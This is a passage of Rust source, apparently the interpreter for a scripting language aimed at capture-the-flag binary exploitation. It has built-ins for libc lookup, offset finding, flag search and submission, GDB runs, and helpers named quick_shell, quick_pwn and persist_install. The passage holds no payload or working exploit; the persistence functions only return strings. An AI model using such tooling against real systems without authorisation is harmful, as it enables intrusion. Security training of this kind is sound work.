                        return Err("persist_install() requires 2 arguments: persist_install(method, target_path)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(method), Value::String(path)) => {
                            Ok(Value::String(format!("Installed persistence via {} at {}", method, path)))
                        }
                        _ => Err("persist_install() requires (string method, string path)".into())
                    }
                }
                "persist_remove" => {
                    if arg_values.is_empty() {
                        return Err("persist_remove() requires 1 argument: persist_remove(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("Removed persistence: {}", method)))
                        }
                        _ => Err("persist_remove() requires string method".into())
                    }
                }
                "libc_search" => {
                    if arg_values.len() < 2 {
                        return Err("libc_search() requires 2 arguments: libc_search(symbol, leaked_addr)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(symbol), Value::Number(addr)) => {
                            match crate::libc_database::libc_search(symbol, *addr as u64) {
                                Ok(matches) => {
                                    let match_list: Vec<Value> = matches.iter().map(|m| {
                                        Value::Map(vec![
                                            ("id".to_string(), Value::String(m.id.clone())),
                                            ("download_url".to_string(), Value::String(m.download_url.clone())),
                                        ].into_iter().collect())
                                    }).collect();
                                    Ok(Value::List(match_list))
                                }
                                Err(e) => Err(format!("libc_search failed: {}", e))
                            }
                        }
                        _ => Err("libc_search() requires (string symbol, number addr)".into())
                    }
                }
                "libc_symbols" => {
                    if arg_values.is_empty() {
                        return Err("libc_symbols() requires 1 argument: libc_symbols(libc_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            match crate::libc_database::libc_symbols(path) {
                                Ok(symbols) => {
                                    let sym_map: std::collections::HashMap<String, Value> = symbols.iter()
                                        .map(|(k, v)| (k.clone(), Value::Number(*v as i64)))
                                        .collect();
                                    Ok(Value::Map(sym_map))
                                }
                                Err(e) => Err(format!("libc_symbols failed: {}", e))
                            }
                        }
                        _ => Err("libc_symbols() requires string path".into())
                    }
                }
                "auto_offset" => {
                    if arg_values.is_empty() {
                        return Err("auto_offset() requires 1 argument: auto_offset(binary)".into());
                    }
                    match &arg_values[0] {
                        Value::String(binary) => {
                            match crate::auto_offset::auto_offset(binary) {
                                Ok(offset) => Ok(Value::Number(offset as i64)),
                                Err(e) => Err(format!("auto_offset failed: {}", e))
                            }
                        }
                        _ => Err("auto_offset() requires string binary path".into())
                    }
                }
                "flag_search" => {
                    if arg_values.is_empty() {
                        return Err("flag_search() requires 1 argument: flag_search(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let flags = crate::flag_tools::flag_search(data);
                            Ok(Value::List(flags.into_iter().map(Value::String).collect()))
                        }
                        Value::String(s) => {
                            let flags = crate::flag_tools::flag_search(s.as_bytes());
                            Ok(Value::List(flags.into_iter().map(Value::String).collect()))
                        }
                        _ => Err("flag_search() requires bytes or string data".into())
                    }
                }
                "flag_submit" => {
                    if arg_values.len() < 2 {
                        return Err("flag_submit() requires 2 arguments: flag_submit(url, flag)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(url), Value::String(flag)) => {
                            match crate::flag_tools::flag_submit(url, flag) {
                                Ok(response) => Ok(Value::String(format!("{}: {}", 
                                    if response.success { "SUCCESS" } else { "FAILED" },
                                    response.message))),
                                Err(e) => Err(format!("flag_submit failed: {}", e))
                            }
                        }
                        _ => Err("flag_submit() requires (string url, string flag)".into())
                    }
                }
                "gdb_run" => {
                    if arg_values.is_empty() {
                        return Err("gdb_run() requires 1 argument: gdb_run(binary)".into());
                    }
                    match &arg_values[0] {
                        Value::String(binary) => {
                            match crate::gdb_parser::gdb_run(binary) {
                                Ok(info) => Ok(Value::Map(vec![
                                    ("signal".to_string(), Value::String(info.signal)),
                                    ("rip".to_string(), Value::Number(info.instruction_pointer as i64)),
                                ].into_iter().collect())),
                                Err(e) => Err(format!("gdb_run failed: {}", e))
                            }
                        }
                        _ => Err("gdb_run() requires string binary path".into())
                    }
                }
                "quick_shell" => {
                    if arg_values.len() < 2 {
                        return Err("quick_shell() requires 2 arguments: quick_shell(host, port)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(host), Value::Number(port)) => {
                            let help = crate::quick_mode::quick_shell(host, *port as u16);
                            println!("{}", help);
                            Ok(Value::Null)
                        }
                        _ => Err("quick_shell() requires (string host, number port)".into())
                    }
                }
                "quick_rop" => {
                    if arg_values.is_empty() {
                        return Err("quick_rop() requires 1 argument: quick_rop(binary)".into());
                    }
                    match &arg_values[0] {
                        Value::String(binary) => {
                            let help = crate::quick_mode::quick_rop(binary);
                            println!("{}", help);
                            Ok(Value::Null)
                        }
                        _ => Err("quick_rop() requires string binary path".into())
                    }
                }
                "quick_pwn" => {
                    if arg_values.len() < 3 {
                        return Err("quick_pwn() requires 3 arguments: quick_pwn(binary, host, port)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(binary), Value::String(host), Value::Number(port)) => {
                            let help = crate::quick_mode::quick_pwn(binary, host, *port as u16);
                            println!("{}", help);
                            Ok(Value::Null)
                        }
                        _ => Err("quick_pwn() requires (string binary, string host, number port)".into())
                    }
                }
                _ => {
                    if let Some(func) = funcs.read().await.get(name).cloned() {
                        let local_vars = Arc::new(RwLock::new(vars.read().await.clone()));
                        for (i, (param_name, _default)) in func.args.iter().enumerate() {
                            if let Some(val) = arg_values.get(i) {
                                local_vars.write().await.insert(param_name.clone(), val.clone());
                            }
                        }
                        let result = interpret_with_scope(&func.body, local_vars, Arc::new(RwLock::new(HashMap::new())), funcs.clone(), macros.clone(), Arc::new(RwLock::new(None)), Arc::new(RwLock::new(crate::runtime_safety::RuntimeSafety::new(crate::runtime_safety::SafetyConfig::default())))).await?;
                        Ok(result.unwrap_or(Value::Null))
                    } else {
                        Err(format!("Unknown function: {}", name))
                    }
                }
            }
        }
        Expr::MacroCall { name, args } => {
            if let Some(_macro) = macros.read().await.get(name).cloned() {
                let mut arg_values = Vec::new();
                for arg_expr in args {
                    arg_values.push(eval_expr(arg_expr, vars.clone(), funcs.clone(), macros.clone()).await?);
                }
                Ok(Value::String(format!("macro {}({:?})", name, arg_values)))
            } else {
                Err(format!("Macro '{}' not found", name))
            }
        }
        Expr::Index { base, index } => {
            let base_val = eval_expr(base, vars.clone(), funcs.clone(), macros.clone()).await?;
            let index_val = eval_expr(index, vars.clone(), funcs.clone(), macros.clone()).await?;
            match (base_val, index_val) {
                (Value::List(list), Value::Number(idx)) => {
                    let idx_usize = idx as usize;
                    let len = list.len();
                    list.get(idx_usize).cloned().ok_or_else(|| {
                        let mut msg = format!("INDEX OUT OF BOUNDS\nIndex: {}, Length: {}\n\n", idx, len);
                        if len > 0 {
                            msg.push_str("Did you mean:\n");
                            msg.push_str(&format!("  1. data[{}]  (last element)\n", len - 1));
                            if idx_usize > len {
                                let extend_count = idx_usize - len + 1;
                                msg.push_str(&format!("  2. Extend list with {} elements\n", extend_count));
                            }
                            msg.push_str("  3. Use conditional check: if idx < len(data)\n");
                        } else {
                            msg.push_str("Note: List is empty. Initialize with values first.\n");
                        }
                        msg
                    })
                }
                (Value::String(s), Value::Number(idx)) => {
                    let idx_usize = idx as usize;
                    let len = s.chars().count();
                    s.chars().nth(idx_usize).map(|c| Value::String(c.to_string())).ok_or_else(|| {
                        let mut msg = format!("INDEX OUT OF BOUNDS\nIndex: {}, String Length: {}\n\n", idx, len);
                        if len > 0 {
                            msg.push_str("Did you mean:\n");
                            msg.push_str(&format!("  1. str[{}]  (last character)\n", len - 1));
                            msg.push_str(&format!("  2. Use slicing: str[0..{}]\n", len));
                        } else {
                            msg.push_str("Note: String is empty.\n");
                        }
                        msg
                    })
                }
                _ => Err("TYPE ERROR\nIndexing requires list or string base and numeric index\n\nExamples:\n  data[0]  (list access)\n  str[5]   (string access)".into()),
            }
        }
        Expr::Slice { base, start, end } => {
            let base_val = eval_expr(base, vars.clone(), funcs.clone(), macros.clone()).await?;
            let start_val = eval_expr(start, vars.clone(), funcs.clone(), macros.clone()).await?;
            let end_val = eval_expr(end, vars.clone(), funcs.clone(), macros.clone()).await?;
            match (base_val, start_val, end_val) {
                (Value::List(list), Value::Number(s), Value::Number(e)) => {
                    let start = s as usize;
                    let end = e as usize;
                    Ok(Value::List(list.get(start..end).unwrap_or(&[]).to_vec()))
                }
                (Value::String(str), Value::Number(s), Value::Number(e)) => {
                    let start = s as usize;
                    let end = e as usize;
                    Ok(Value::String(str.chars().skip(start).take(end - start).collect()))
                }
                _ => Err("Slicing requires list or string and numeric range".into()),
            }
        }
        Expr::Pack { size, value } => {
            let val = eval_expr(value, vars.clone(), funcs.clone(), macros.clone()).await?;
            if let Value::Number(n) = val {
                let bytes = match size {
                    64 => n.to_le_bytes().to_vec(),
                    32 => (n as u32).to_le_bytes().to_vec(),
                    16 => (n as u16).to_le_bytes().to_vec(),
                    8 => vec![n as u8],
                    _ => return Err(format!("Unsupported pack size: {}", size)),
                };
                Ok(Value::Bytes(bytes))
            } else {
                Err(format!("Pack requires number, got {:?}", val))
            }
        }
        Expr::Unpack { size, data } => {
            let val = eval_expr(data, vars.clone(), funcs.clone(), macros.clone()).await?;
            if let Value::Bytes(bytes) = val {
                let num = match size {
                    64 => {
                        if bytes.len() >= 8 {
                            i64::from_le_bytes(bytes[0..8].try_into().unwrap())
                        } else {
                            return Err("Not enough bytes for u64".into());
                        }
                    }
                    32 => {
                        if bytes.len() >= 4 {
                            u32::from_le_bytes(bytes[0..4].try_into().unwrap()) as i64
                        } else {
                            return Err("Not enough bytes for u32".into());
                        }
                    }
                    16 => {
                        if bytes.len() >= 2 {
                            u16::from_le_bytes(bytes[0..2].try_into().unwrap()) as i64
                        } else {
                            return Err("Not enough bytes for u16".into());
                        }
                    }
                    8 => {
                        if !bytes.is_empty() {
                            bytes[0] as i64
                        } else {
                            return Err("Not enough bytes for u8".into());
                        }
                    }
                    _ => return Err(format!("Unsupported unpack size: {}", size)),
                };
                Ok(Value::Number(num))
            } else {
                Err(format!("Unpack requires bytes, got {:?}", val))
            }
        }
        Expr::Spread(_) => {
            Err("Spread operator can only be used inside list literals".into())
        }
        Expr::Pipe { stages } => {
            let mut current_value = None;
            for (i, stage) in stages.iter().enumerate() {
                if i == 0 {
                    current_value = Some(eval_expr(stage, vars.clone(), funcs.clone(), macros.clone()).await?);
                } else {
                    match stage {
                        Expr::Ident(func_name) => {
                            let input = current_value.take().unwrap();
                            match func_name.as_str() {
                                "p64" => {
                                    if let Value::Number(n) = input {
                                        current_value = Some(Value::Bytes(n.to_le_bytes().to_vec()));
                                    } else {
                                        return Err("p64 requires a number".into());
                                    }
                                }
                                "p32" => {
                                    if let Value::Number(n) = input {
                                        current_value = Some(Value::Bytes((n as u32).to_le_bytes().to_vec()));
                                    } else {
                                        return Err("p32 requires a number".into());
                                    }
                                }
                                "p16" => {
                                    if let Value::Number(n) = input {
                                        current_value = Some(Value::Bytes((n as u16).to_le_bytes().to_vec()));
                                    } else {
                                        return Err("p16 requires a number".into());
                                    }
                                }
                                "p8" => {
                                    if let Value::Number(n) = input {
                                        current_value = Some(Value::Bytes(vec![n as u8]));
                                    } else {
                                        return Err("p8 requires a number".into());
                                    }
                                }
                                _ => {
                                    return Err(format!("Unknown function in pipe: {}", func_name));
                                }
                            }
                        }
                        Expr::Call { name, args } => {
                            let input = current_value.take().unwrap();
                            vars.write().await.insert("_".to_string(), input);
                            let mut all_args = vec![(None, Expr::Ident("_".to_string()))];
                            all_args.extend(args.clone());
                            current_value = Some(eval_expr(&Expr::Call { name: name.clone(), args: all_args }, vars.clone(), funcs.clone(), macros.clone()).await?);
                        }
                        _ => {
                            return Err("Pipe stages must be function names or function calls".into());
                        }
                    }
                }
            }
            current_value.ok_or("Empty pipe".into())
        }
        Expr::Return(_) => Err("Return outside function".into()),
    }
    })
}

fn levenshtein_distance(s1: &str, s2: &str) -> usize {
    let len1 = s1.len();
    let len2 = s2.len();
    let mut matrix = vec![vec![0; len2 + 1]; len1 + 1];
    
    for i in 0..=len1 {
        matrix[i][0] = i;
    }
    for j in 0..=len2 {
        matrix[0][j] = j;
    }
    
    for (i, c1) in s1.chars().enumerate() {
        for (j, c2) in s2.chars().enumerate() {
            let cost = if c1 == c2 { 0 } else { 1 };
            matrix[i + 1][j + 1] = std::cmp::min(
                std::cmp::min(
                    matrix[i][j + 1] + 1,
                    matrix[i + 1][j] + 1
                ),
                matrix[i][j] + cost
            );
        }
    }
    
    matrix[len1][len2]
}
